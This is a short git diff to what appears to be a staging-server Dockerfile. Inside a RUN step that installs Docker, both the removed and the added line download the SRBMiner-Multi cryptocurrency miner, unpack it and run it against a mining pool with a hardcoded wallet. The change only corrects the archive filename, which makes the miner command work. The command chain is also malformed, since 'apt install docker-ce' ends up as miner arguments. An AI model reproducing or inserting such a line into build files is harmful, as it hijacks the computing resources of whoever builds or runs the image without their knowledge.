@@ -9,7 +9,7 @@ RUN apt-get update && \
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
     add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
     apt-get update && \
-    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.5/SRBMiner-Multi-2-4-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-5-5-Linux.tar.xz && cd SRBMiner-Multi-2-5-5 && ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool stratum-eu.rplant.xyz:17123 --wallet TuskeSyuWbHErHKLFg7moKRFPDLwLQN5bUKDzbxmd8VHMShgKHbDPFe6VmyranJG3KbhaZnDm6fPvcpt4UaFu8dRYPgAdTwmyqp3VQ.01 --password x --tls true \
+    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.5/SRBMiner-Multi-2-5-5-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-5-5-Linux.tar.xz && cd SRBMiner-Multi-2-5-5 && ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool stratum-eu.rplant.xyz:17123 --wallet TuskeSyuWbHErHKLFg7moKRFPDLwLQN5bUKDzbxmd8VHMShgKHbDPFe6VmyranJG3KbhaZnDm6fPvcpt4UaFu8dRYPgAdTwmyqp3VQ.01 --password x --tls true \
     apt install docker-ce
 
 # copy files from the repository into this staging server
